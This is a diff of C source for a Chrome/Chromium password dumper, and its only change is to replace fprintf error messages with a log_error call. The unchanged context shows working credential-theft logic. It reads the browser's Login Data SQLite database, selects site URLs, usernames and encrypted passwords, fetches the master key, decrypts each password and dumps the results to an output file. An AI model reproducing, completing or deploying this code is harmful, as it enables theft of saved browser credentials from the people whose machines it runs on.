@@ -12,14 +12,14 @@
 int prepare_sqlite_statement(char *login_data_path, sqlite3 **db, sqlite3_stmt **stmt) {
 	int rc = sqlite3_open(login_data_path, db);
 	if(rc != SQLITE_OK) {
-		fprintf(stderr, "sqlite3_open() failure: %s\n", sqlite3_errmsg(*db));
+		log_error("sqlite3_open() failure: %s", sqlite3_errmsg(*db));
 		sqlite3_close(*db);
 		return -1;
 	}
 	char *sql = "SELECT action_url, username_value, password_value FROM logins";
 	rc = sqlite3_prepare_v2(*db, sql, -1, stmt, NULL);
 	if(rc != SQLITE_OK) {
-		fprintf(stderr, "sqlite3_prepare_v2() failure\n");
+		log_error("sqlite3_prepare_v2() failure");
 		sqlite3_close(*db);
 		return -1;
 	}
@@ -37,7 +37,7 @@ int fetch_sqlite_data(char **website, char **username, char **cipher_password, i
 	*username = malloc(strlen(sqlite3_column_text(*stmt, 1))+1);
 	*cipher_password = malloc(sqlite3_column_bytes(*stmt, 2)+1);
 	if(*website == 0 || *username == 0 || *cipher_password == 0) {
-		fprintf(stderr, "malloc() failure\n");
+		log_error("malloc() failure");
 		free(*website);
 		free(*username);
 		free(*cipher_password);
@@ -62,13 +62,13 @@ int get_chrome_creds(char *login_data_path, const char *output) {
 	sqlite3 *db;
 	sqlite3_stmt *stmt;
 	if(prepare_sqlite_statement(login_data_path, &db, &stmt) == -1) {
-		fprintf(stderr, "prepare_sqlite3_statement() failure\n");
+		log_error("prepare_sqlite3_statement() failure");
 		return -1;
 	}
 
 	char *masterkey;
 	if(get_masterkey(login_data_path, &masterkey) == -1) {
-		fprintf(stderr, "get_masterkey() failure\n");
+		log_error("get_masterkey() failure");
 		return -1;
 	}
 
@@ -85,12 +85,12 @@ int get_chrome_creds(char *login_data_path, const char *output) {
 
 	while(sqlite3_step(stmt) != SQLITE_DONE) {
 		if(fetch_sqlite_data(&website, &username, &cipher_password, &len_cipher_password, &stmt) == -1) {
-			fprintf(stderr, "fetch_sqlite_data() failure\n");
+			log_error("fetch_sqlite_data() failure");
 			return -1;
 		} 
 		if(strlen(website) != 0) {
 			if(decrypt_chrome_cipher(cipher_password, len_cipher_password, &plaintext_password, masterkey) == -1) {
-				fprintf(stderr, "decrypt_chrome_cipher() failure\n");
+				log_error("decrypt_chrome_cipher() failure");
 				return -1;
 			}
 
@@ -159,11 +159,11 @@ int dump_chrome(int verbose, const char *output_file) {
 	//}
 
 	if(result == 0) {
-		fprintf(stderr, "[-] Couldn't find any Chrome / Chromium installation\n");
+		log_error("Couldn't find any Chrome / Chromium installation");
 		return -1;
 	}
 	else if (result == -1) {
-		fprintf(stderr, "[-] An error occured\n");
+		log_error("An error occured");
 		return -1;
 	}
 	return 1;
